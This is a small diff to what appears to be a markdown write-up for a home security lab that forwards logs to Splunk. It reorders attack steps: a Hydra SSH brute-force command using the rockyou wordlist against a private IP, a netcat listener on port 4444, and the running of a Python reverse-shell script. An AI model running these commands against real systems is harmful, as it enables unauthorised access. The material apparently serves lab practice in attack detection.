@@ -99,17 +99,15 @@ sudo /opt/splunkforwarder/bin/splunk restart
 ```bash
 hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131
 ```
-
-### 2. Reverse Shell via Python Script
-
-```bash
-python3 ssh_bruteforce_reverse.py
-```
-
-### 3. Netcat Listener on Kali
+### 2. Netcat Listener on Kali
 
 ```bash
 nc -lvnp 4444
+```
+### 3. Reverse Shell via Python Script
+
+```bash
+run ssh_reverse_shell_1.2.py
 ```
 
 ---
